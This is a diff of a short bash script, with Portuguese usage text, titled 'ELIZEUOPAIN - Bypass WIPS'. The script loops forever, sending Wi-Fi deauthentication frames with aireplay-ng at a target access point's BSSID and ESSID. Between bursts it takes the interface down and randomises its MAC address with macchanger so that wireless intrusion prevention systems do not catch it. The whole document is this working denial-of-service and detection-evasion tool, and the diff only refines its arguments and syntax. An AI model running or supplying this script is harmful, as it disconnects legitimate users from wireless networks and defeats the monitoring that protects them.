@@ -1,16 +1,23 @@
 #!/bin/bash
 
-if ["$1" == ""]
-then
-	echo "ELIZEUOPAIN - DoS Wifi - Bypass WIPS"
-	echo "Modo de uso: $0 interface(wlan1) canal(6) BSSID(MAC Adress Alvo)"
-	echo "Exemplo: $0 wlan1mon 6 FF:GG:BB:CC:AA:ZZ"
+interface="$1"
+ponto_acesso="$2"
+channel="$3"
+ESSID="$4"
 
-while true
-do
-	iw dev $1 set channel $2
-	aireplay-ng --deauth 1 -a $3 $1 | grep "deauth"
-	macchanger -r $1 | grep "New Mac"
-	ip link set $1 up
-	sleep 5
-done
+if [ "$1" = "" ]
+then
+    echo "ELIZEUOPAIN - Bypass WIPS"
+    echo "Modo de uso: $0 interface BSSID(MAC Address Alvo) Channel ESSID"
+    echo "Exemplo: $0 wlan1mon FF:GG:BB:CC:AA:ZZ 6 AA:BB:CC:DD:EE:FF"
+else
+    while true
+    do
+        iwconfig "$interface" channel "$channel"
+        aireplay-ng -0 1 -a "$ponto_acesso" -e "$ESSID" "$interface" | grep "deauth"
+        ifconfig "$interface" down
+        macchanger -r "$interface" | grep "New MAC"
+        ifconfig "$interface" up
+        sleep 5
+    done
+fi
